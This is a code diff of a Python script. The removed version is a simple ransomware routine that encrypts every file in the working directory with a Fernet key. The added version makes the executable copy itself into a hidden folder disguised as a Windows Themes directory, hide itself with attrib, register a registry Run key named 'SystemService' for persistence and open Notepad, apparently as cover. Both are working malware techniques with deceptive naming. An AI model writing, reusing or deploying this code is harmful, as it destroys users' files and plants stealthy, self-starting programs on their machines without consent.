@@ -1,28 +1,41 @@
 import os
-import time
+import shutil
+import subprocess
+import sys
+import winreg
 
-from cryptography.fernet import Fernet
+def get_hidden_path():
+    hidden_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Themes", "SystemData")
+    os.makedirs(hidden_dir, exist_ok=True)
+    exe_name = "hidden_program.exe"
+    return os.path.join(hidden_dir, exe_name)
 
-files = []
+def copy_to_hidden_location(target_path):
+    current_path = sys.executable  # Current .exe location
+    if current_path != target_path:
+        shutil.copyfile(current_path, target_path)
+        subprocess.call(["attrib", "+h", target_path])        # Hide file
+        subprocess.call(["attrib", "+h", os.path.dirname(target_path)])  # Hide folder
+        os.startfile(target_path)
+        sys.exit()
 
-for file in os.listdir():
-    if file == "testfile.py" or file == "test-ransomware.exe" or file == "Wkey.key":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+def add_to_startup(target_path):
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0, winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, target_path)
+    winreg.CloseKey(key)
 
-print(files)
+def open_notepad():
+    subprocess.Popen(["notepad.exe"])
 
-key = Fernet.generate_key()
+def main():
+    target_path = get_hidden_path()
+    copy_to_hidden_location(target_path)
+    add_to_startup(target_path)
+    open_notepad()
 
-print(key)
-
-with open("Wkey.key", "wb") as Wkey:
-    Wkey.write(key)
-
-for file in files:
-    with open(file, "rb") as thefile:
-        content = thefile.read()
-    content_encrypted = Fernet(key).encrypt(content)
-    with open(file, "wb") as thefile:
-        thefile.write(content_encrypted)
+if __name__ == "__main__":
+    main()
